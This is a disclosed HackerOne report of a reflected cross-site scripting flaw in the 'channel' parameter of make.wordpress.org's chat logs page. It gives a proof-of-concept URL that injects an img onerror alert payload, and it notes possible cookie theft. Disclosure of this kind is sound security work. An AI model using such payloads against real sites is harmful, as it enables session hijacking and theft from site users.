# Reflected XSS on https://make.wordpress.org via 'channel' parameter

## Report Details
- **Report ID**: 659419
- **URL**: https://hackerone.com/reports/659419
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-07-25T10:56:27.823Z
- **Disclosed**: 2019-08-26T00:45:03.993Z

## Reporter
- **Username**: gnux
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hi there,
I just found a reflected XSS on make.wordpress.org domain.

steps to reproduce : 
1. visit this link :
https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
2. xss pop up will occurs

POC:
see:wp reflected xss.png

Note: it works on the latest version of firefox

## Impact

some of xss impact like stealing cookies, session hijacking, etc ..

## Attachments
- wp_reflected_xss.png
